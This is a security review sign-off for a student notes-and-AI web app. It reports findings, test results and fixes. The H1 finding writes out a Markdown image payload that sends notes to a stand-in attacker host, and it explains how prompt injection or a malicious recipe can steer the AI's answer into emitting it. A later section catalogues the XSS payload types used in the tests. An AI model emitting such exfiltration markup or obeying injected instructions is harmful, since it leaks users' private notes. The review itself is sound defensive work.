# Phase 2 — Nitpick Sign-off

**Reviewer:** Nitpick · **Date:** 2026-10-03 · **Branch:** `phase-2-hub-core`
**Re-verified at:** El Código's commit `b1d130a`, plus Nitpick's second-pass
tests (`tests/unit/signoff2.test.mjs`, `tests/e2e/signoff2.spec.mjs`, and a
global CSP tripwire in `tests/helpers/fixtures.mjs`).

## Verdict: NOT SIGNED OFF

**H1, the high-severity finding, is fixed, and I re-attacked it at both
layers.** No high-severity finding remains. Two problems still block, because
sign-off requires every test to pass:

- **R1 (medium): the M5 tool review can be bypassed.** Acceptance is stored
  per `id@version` only:
  - A repo the student already trusted can change a tool's permissions
    (`run_ai` → `search_brain` + `run_ai`, query `"passwords bank account"`)
    without bumping the version, and it runs with no new review.
  - A different repo can reuse the same `id@version` and inherit the
    acceptance.
  - **Fix:** key `hub.toolAcks` by repo plus a hash of the recipe text, or at
    least repo + id + the permissions and query.
  - **Where:** `core/app.js` `renderTool`, the `ackKey` line.
- **R2 (medium): the setup Connect button runs twice, which hides the L7/L8
  messages.**
  - **Cause:** `brain-connect` is a submit button inside a form whose
    `onsubmit` calls `connect.click()`. One click runs the handler twice.
  - **Effect:** the second run starts with `refused.hidden = true`, then says
    "Fill in all four boxes", because the password was already cleared. So:
    - the L8 secret-key refusal ("…rotate it in Supabase") is hidden at once;
    - the L7 address message is replaced.
  - **What still holds:** the security property. No request is sent, which I
    checked in a debug run. But the student is told the wrong thing, and the
    advice to rotate a leaked secret key never shows.
  - **Fix:** give `brain-connect` `type="button"`, or drop the
    `onsubmit → click` relay.
  - **Where:** `core/app.js`, `setupBrain`, the `connect` button and its
    `h('form', { onsubmit … })` wrapper.

Fix R1 and R2 and make `tests/e2e/signoff2.spec.mjs` pass in all three
projects, and I'll sign off. Nothing else is outstanding.

## Test results (`npm test`, full run at `b1d130a`)

| Suite | Tests | Passed | Failed | Skipped |
|---|---|---|---|---|
| Unit (`tests/unit`) | 248 | 248 | 0 | 0 |
| Database proof (`tests/db`) | 10 | 10 | 0 | 0 |
| Browser (`tests/e2e`), 82 tests × 3 projects | 246 | 229 | **15** | 2 |

- **The 15 failures** are 5 tests, each failing in all three projects:
  - R1: two tests ("…asks for more permissions (same version)…" and
    "acceptance for one repo does not carry over…").
  - R2: three tests (the L7 address test, and the L8 tests for an
    `sb_secret_` key and a service-role JWT).
  - Each fails at the assertion that names the defect, not in the harness.
- **The 2 skips** are unchanged from the first pass: the tap-target check
  doesn't apply at laptop size, and WebKit can't reload a page while offline.
- **El Código reported 190/2** before my new tests existed. That matches the
  first-pass suite.

## Status of every finding

| # | Finding | Status | Evidence |
|---|---|---|---|
| H1 | AI output could leak brain notes | **Fixed, verified at both layers** | See "H1 re-attack" below |
| M1 | Sign-out left saved runs; no server logout | **Fixed** | Unit and e2e: `hub.runs.*` and the session removed; `POST /auth/v1/logout` sent with the old bearer token; works offline |
| M2 | Export included saved runs | **Fixed** | e2e: the export's keys are exactly `hub.brain`, `hub.localTools`, `hub.settings`; no brain notes |
| M3 | No privacy warning for core/plugin tools | **Fixed** | e2e: `auto-privacy-warning` holds `PRIVACY_WARNING` in Automatic setup, and is hidden in Manual |
| M4 | Parallel token refresh | **Fixed** | Unit: two concurrent calls → one `refresh_token` request, and both use the new token |
| M5 | Repo override installs tools silently | **Partly fixed, R1 open** | e2e: `tool-review` → `tool-accept` works and is remembered; no review without an override. Bypassed by a same-version change or another repo |
| L1 | UTC date | **Fixed** | e2e in `America/Mexico_City` at 20:00 local, when UTC is already 10-04: the prompt says `2026-10-03` and the download is `company-news-2026-10-03.md` |
| L2 | Malformed tool link | **Fixed** | e2e: `#/tool/%E0%A4%A` shows "Tool not found" |
| L3 | Copy-and-paste mode stuck | **Fixed** | e2e: after a 401 → switch-to-manual, the next Run calls OpenRouter again |
| L4 | Offline fallback for any request | **Fixed (code read)** | `sw.js` falls back to `index.html` only for navigations |
| L5 | Archive reported success when nothing changed | **Fixed** | Unit (`return=representation`, empty result → `not-found`); e2e: the row deleted elsewhere stays listed and the button is re-enabled |
| L6 | Hidden duplicates not shown | **Fixed** | e2e: `tool-conflict` names `hello-hub`; the core tool wins |
| L7 | Any https brain address | **Logic fixed; UI message broken by R2** | Unit: `isSupabaseUrl` refuses http, look-alike hosts and paths. e2e fails on the message (R2) |
| L8 | Secret key refused as "open" | **Logic fixed; UI message broken by R2** | Unit: `keyProblem` catches `sb_secret_` and service-role JWTs, including base64url payloads. e2e fails on the hidden refusal (R2) |

## H1 re-attack

**Sanitizer layer** (`signoff2.spec`, all three projects, passing).

An answer with 30 payloads:
- **Images:** a Markdown image, a reference-style image, a `javascript:`
  image, raw `<img onerror>`, `srcset`, and `<picture>`.
- **SVG and MathML:** `<svg><image>`, `<svg onload>`, and a
  `<math><mtext><table><mglyph><style>` mutation-XSS chain.
- **Other mutation XSS:** a `<noscript>` title chain.
- **CSS:** `<style>@import` and `url()`, inline `style=`, and
  `<link rel=stylesheet|prefetch>`.
- **Forms:** `<form action>` with a password input, and `<button formaction>`.
- **Navigation:** `<meta http-equiv=refresh>` and `<base href>`.
- **Embeds:** `<iframe>`, `<object>`, `<embed>`, `<video poster>`,
  `<audio autoplay>`, `<table background>`, and `<a ping>`.
- **Events:** `<details ontoggle>`.
- **Dangerous links:** `javascript:` (plain and with a leading space),
  `vbscript:`, two `data:` links, and `<input type=image>`.

After rendering:
- No forbidden tag remains.
- No `on*`, `style`, `srcset`, `ping`, `background`, `poster`, `action`,
  `formaction` or `src` attribute remains.
- Every `href` is `http(s):`, `mailto:` or `#`.
- `window.__pwned` is unset, the page didn't navigate, and no request to the
  attacker host was made.
- Legitimate links still render, and images become `[image: …]` links.

**CSP layer** (passing in all three projects). Markup injected straight into
the page, skipping the sanitizer, was all blocked by the CSP:
- an `<img>`, `new Image()`, and inline `style` and `<style>`;
- an inline `<script>`, `fetch`, and `sendBeacon`;
- a form `submit()` to the attacker.

The route-level network guard saw no request leave. `img-src`, `connect-src`
and `script-src` violations were recorded in Chromium and WebKit.
- **A measuring artifact, not a leak:** Chromium emits a Playwright `request`
  event even for an image the CSP blocked ("The action has been blocked"). I
  verified this in a debug run. That's why the proof uses the route guard,
  not request events.

**The CSP breaks nothing legitimate.** Every e2e test now fails on any CSP
violation, through the global tripwire in `tests/helpers/fixtures.mjs`. All
normal flows pass under it:
- setup, both AI modes, with and without a brain;
- save, download and archive;
- Add tool and plugin discovery;
- settings, layout, and the PWA and service worker.

The only exempt tests are the deliberate attack tests.

## New low-severity notes (not blocking)

- **L9 — harmless console noise in Chromium.** When an answer contains inline
  `style` or `<base>`, DOMPurify parses it in an inert document that inherits
  the page's CSP, and Chromium logs `style-src`/`base-uri` violations. Nothing
  loads. It only clutters the console.
- **L10 — custom domains are refused.** `isSupabaseUrl` refuses Supabase
  custom domains (a paid feature). Acceptable for students. Document it if a
  custom-domain brain ever turns up.
- **L11 — `connect-src` allows any project.** `https://*.supabase.co` admits
  any Supabase project, including an attacker's. It only matters for script
  the app runs, and the CSP's `script-src 'self'` keeps injected script out.
  No action needed.

## What is proven, and what is not

Unchanged from the first review (below), plus everything in the status table
above. Real-device and real-service items are still on
`docs/PILOT-CHECKLIST.md`.

---

## History: first review at `67e6f35`


### Verdict: NOT SIGNED OFF

There is one blocking item: **H1, brain notes can leak through images in AI
answers.** Everything else is ready. Fix H1 and make
`tests/e2e/signoff.spec.mjs` pass in all three projects, and I'll sign off.
Medium findings M1–M5 should be fixed in Phase 2 if they're cheap. Otherwise
they go on the Phase 3 list. None of them blocks.

### Test results (`npm test`, full run)

| Suite | Tests | Passed | Failed | Skipped |
|---|---|---|---|---|
| Unit (`tests/unit`) | 228 | 228 | 0 | 0 |
| Database proof (`tests/db`) | 10 | 10 | 0 | 0 |
| Browser (`tests/e2e`), 64 tests × 3 projects | 192 | 187 | **3** | 2 |

- **Projects:** `desktop-chromium`, `iphone-webkit` (iPhone 13), and
  `android-chromium` (Pixel 7).
- **The 3 failures** are the same test in each project: "AI output cannot
  make the browser load remote images or render forms" (H1).
- **The 2 skips** are deliberate:
  - The 44px tap-target check is skipped on the laptop project, where it
    doesn't apply.
  - The offline-reload test is skipped on WebKit. Playwright's WebKit throws
    an internal error when it reloads a page offline.

### What is proven

- **"Done when."** The dummy tool `hello-hub` runs end to end in Automatic and
  Manual mode, with and without a brain. This holds at laptop size and in
  iPhone (WebKit) and Android (Chromium) emulation.
- **Open-database check.** It was proven on the real Express migration in
  local Postgres (PGlite), with nothing stripped:
  - A locked brain gives `42501` from row-level security.
  - An open June-cohort brain gives `23502`.
  - Zero rows are written, whether the table is empty or seeded.
  - Through the UI, `open`, `not-express` and unreachable brains are refused
    before any sign-in request.
- **Credentials.**
  - The password is sent only to `auth/v1/token?grant_type=password`.
  - It is never stored, and the field is cleared before the network call.
  - The settings export contains neither the OpenRouter key nor the session.
  - No secret or service-role key appears in any request.
- **Save, recent and archive.** Saving writes the exact row from DECISIONS Q2,
  with no top-level `tags`, `category` or `summary`. A repeat save is an
  upsert, so the brain keeps one row. Enrichment leaves `metadata.hub` intact.
  Edited summaries and edited tags reach the row. Archive hides an item
  without deleting it.
- **Web search and model fallback.**
  - The full decision table is covered: required, helpful and none, in
    Automatic mode with paid search on and off, and in Manual mode.
  - A 429 moves to the next model.
  - A 401 stops and offers copy-and-paste.
- **Recipes.**
  - Every WIDGET-GUIDE rule is checked, with all errors collected.
  - HTML and `javascript:` are rejected.
  - The install summary shows the exact permissions, the query with
    `[Label]`, the web-search setting and the privacy warning.
- **Tool discovery.** Covered paths:
  - the GitHub contents API;
  - the 10-minute cache, with Refresh bypassing it;
  - the `plugins.json` fallback;
  - core tools beating plugin tools with the same id.
- **Phone layout.** No screen scrolls sideways at 320px or at any device
  size. Buttons are at least 44×44 on phones.
- **PWA.** The manifest is correct and both PNG icons are real. The service
  worker is registered from a relative path. It caches only same-origin shell
  files, never `plugins/` or `core/tools/`.

### What is not proven

These items need real devices or real services. They are listed in
`docs/PILOT-CHECKLIST.md`:

- iPhone and Android clipboard behavior, and handing off to the AI app;
- install prompts and how long storage lasts;
- the open check against a real June-cohort brain;
- Express detection on a real Supabase gateway;
- real CORS from github.io;
- token refresh after an hour;
- a real OpenRouter call and real fallback;
- real GitHub listing;
- the on-screen keyboard, safe areas, and the installed app starting offline
  on iPhone.

### Findings from code review

Severity means what a student or their brain could lose.
**High** blocks sign-off. **Medium** should be fixed. **Low** is noted.

### High

**H1 — AI output can send brain notes to any server, with no click.**
- **Where:** `core/app.js:602`, with `index.html` (no Content-Security-Policy).
- **Cause:** results are rendered with `DOMPurify.sanitize(marked.parse(text))`
  using the **default** config. That config keeps
  `<img src="https://…">`, `<form>`, `<input>`, `<button>` and `<style>`.
- **The attack:** an answer that contains
  `![x](https://attacker/?d=<notes>)` makes the browser fetch that URL as soon
  as the result is shown. The answer can be steered three ways:
  - a pasted or plugin recipe whose prompt tells the AI to add the image
    (the prompt already contains `{{brain_context}}`);
  - prompt injection from a web page the AI read for a `required` or
    `helpful` tool;
  - a pasted answer in Manual mode.
- **Proof:** `tests/e2e/signoff.spec.mjs` shows the image rendered. The
  network guard recorded the real request to `evil.example` in all three
  projects. The same gap lets an answer draw a fake "re-enter your password"
  form.
- **Fix:**
  - Sanitize with `FORBID_TAGS: ['img','picture','source','video','audio','form','input','button','textarea','select','style','iframe','object','embed']`.
    Optionally, turn remote images into plain links.
  - Add a CSP meta tag as defence in depth. For example:
    `default-src 'self'; img-src 'self' data:; connect-src 'self' https://*.supabase.co https://openrouter.ai https://api.github.com https://raw.githubusercontent.com; form-action 'none'`.
    That also needs the inline service-worker registration moved into a file,
    or hashed.

### Medium

**M1 — Signing out leaves brain notes in the browser.**
- **Where:** `core/app.js:785`, `core/lib/brain.js:118`.
- **What:** `settings-signout` removes only `hub.session`. Every
  `hub.runs.<tool>` keeps the full prompt, including the brain notes, and the
  AI answer, with no time limit. The next person to use a university lab PC
  can read them.
- **Also:** the refresh token isn't revoked on the server
  (`POST /auth/v1/logout` is never called).
- **Fix:** clear `hub.runs.*` on sign-out, and call logout.

**M2 — The settings export includes brain notes and answers.**
- **Where:** `core/app.js:803`.
- **What:** it exports every `hub.*` key except the key and the session. That
  includes `hub.runs.*`, so the prompts carry brain context. The file is
  called "settings", and students will share it.
- **Fix:** export only `hub.settings`, `hub.brain` and `hub.localTools`, or
  leave out `hub.runs.*`. PLAN's wording, "every key except", should change
  to match.

**M3 — Core and plugin tools send brain notes to OpenRouter without the
privacy warning.**
- **Where:** `core/app.js:251-259` (Automatic setup), and the flow in
  `core/app.js:87-98`.
- **What:** DECISIONS change 6 promises the warning. Today it appears only in
  the install summary, which is shown only for pasted tools. `hello-hub`
  (search_brain + run_ai) and every `plugins/` tool skip it. So does a repo
  set by `settings-repo-override`: a classmate saying "point it at my repo"
  installs their tools silently.
- **Fix:**
  - Show `PRIVACY_WARNING` once in the Automatic setup panel.
  - Show a tool's permissions the first time it runs, if it didn't come
    through Add tool.

**M4 — Two parallel token refreshes.**
- **Where:** `core/lib/brain.js:48-62`, called from `core/app.js:341` and
  `:348`.
- **What:** Home calls `profile()` and `recent()` at the same time. When the
  token is near expiry, both send `grant_type=refresh_token` with the same
  refresh token. Supabase usually tolerates that within its 10-second reuse
  window. If it doesn't, the student is signed out.
- **Fix:** share one in-flight refresh promise.

**M5 — A repo override silently replaces where tools come from.**
- **Where:** `core/app.js:768-776`.
- **What:** combined with M3 and H1, one pasted `owner/repo` gives someone
  else's recipes full access to the brain, with no review step.
- **Fix:** M3's first-run permission screen covers this.

### Low

- **L1 — "Today" is the UTC date.** `core/app.js:63` and
  `core/lib/save.js:4`. After 6 pm in Mexico (UTC−6), `{{today}}` and the
  download file name show tomorrow. Use the local date.
- **L2 — A malformed tool link breaks the screen.** `core/app.js:110`:
  `decodeURIComponent` throws on a hash like `#/tool/%E0`, which leaves a
  blank screen.
- **L3 — Copy-and-paste mode sticks.** `core/app.js:537-540`: after
  `switch-to-manual`, `st.mode = 'manual'` is saved per tool. That tool stays
  in Manual mode, even after the key is fixed, until "Start over".
- **L4 — Offline, a JS file can be answered with the home page.** `sw.js:39`:
  when a request fails and isn't cached, the fallback is `index.html` for
  every request, including JS modules.
- **L5 — Archive can report success when nothing changed.**
  `core/lib/brain.js:164-171`: a PATCH that matches no row (blocked by RLS,
  or already deleted) returns 204, and `archive` reports `ok`.
- **L6 — A pasted tool can be silently hidden later.**
  - `core/lib/plugins.js:84-93` with `core/app.js:687`.
  - A pasted tool is hidden without a word if a plugin with the same id
    appears later.
  - The `conflicts` list is computed but never shown.
- **L7 — Any https server can receive the password.** `core/app.js:168`: the
  brain address only has to start with `https://`. A server that answers
  `{"code":"42501"}` will receive the password. The risk is limited, because
  the student types the address themselves.
- **L8 — A pasted secret key gets the wrong refusal message.** If a student
  pastes a secret or service-role key, the probe gets past RLS and returns
  `23502`. The hub refuses, which is correct, but says "this brain is open",
  which is wrong. Add a key-format check (`sb_secret_`, or a JWT with
  `role=service_role`) and a matching message.

### Checked and found sound

- **Password handling** (`core/app.js:165-166`): the value is read, then the
  field is cleared before any `await`. It goes only to `signIn`.
- **Text rendering:**
  - Every recipe field, error message, brain row and server error reaches the
    DOM through `textContent`. `h()` never assigns `innerHTML`.
  - The only `innerHTML` is the DOMPurify result (H1).
  - Links are rewritten to `target=_blank rel="noopener noreferrer"`.
- **Template filling** is one pass. A typed `{{brain_context}}` can't pull
  notes into the prompt (`core/lib/prompt.js:10`).
- **The open check** follows PLAN exactly (`core/lib/brain.js:86-105`). Only
  `locked` leads to sign-in. Any doubt in the OPTIONS step counts as
  `locked`, but only after the RLS probe has already decided.
- **Recipe validation** (`core/lib/recipe.js`) enforces every rule in
  WIDGET-GUIDE §3–§9. The HTML check covers the whole text, front matter
  included.
- **The service worker** never caches other origins, `plugins/` or
  `core/tools/`.

### Changes to tests in this pass

- **`recipe.test.mjs`:** the old "first line must be ---" test is replaced by
  the amended rule. Leading blank lines and whitespace are accepted, CRLF
  included. Leading text or a code fence is rejected.
- **New unit tests:**
  - `buildSaveRow` with explicit `tags`;
  - `discoverTools({ force: true })` skips a fresh cache, then re-caches.
- **New e2e tests** (`tests/e2e/signoff.spec.mjs`, three projects):
  - edited save-tags reach the saved row;
  - `refresh-tools` bypasses a fresh cache and finds a newly listed plugin;
  - `nav-home` works from the tool, Add and Settings screens;
  - the H1 output-hardening test.
